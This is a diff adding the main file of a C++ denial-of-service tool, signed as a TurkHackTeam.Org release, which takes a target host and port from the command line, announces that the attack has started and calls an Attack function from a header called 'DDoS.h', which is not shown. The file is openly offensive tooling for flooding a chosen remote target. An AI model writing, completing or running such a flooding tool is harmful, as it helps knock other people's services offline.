@@ -1,0 +1,17 @@
+#include <iostream>
+#include "DDoS.h"
+
+/*
+by ix Tr
+TurkHackTeam.Org
+Version 1.0.0.1.0
+*/
+
+using namespace std;
+int main(int argc, char* argv[]){
+        cout << "[*] Num of args: " << argc
+             << "\n\n[+] RHOST: " << argv[1]
+             << "\n[+] RPORT: " << argv[2]
+             << "\n<< Attack Started >>" << endl;
+        Attack(argv[1], argv[2]); //DDoS.h Fonksiyonu
+}
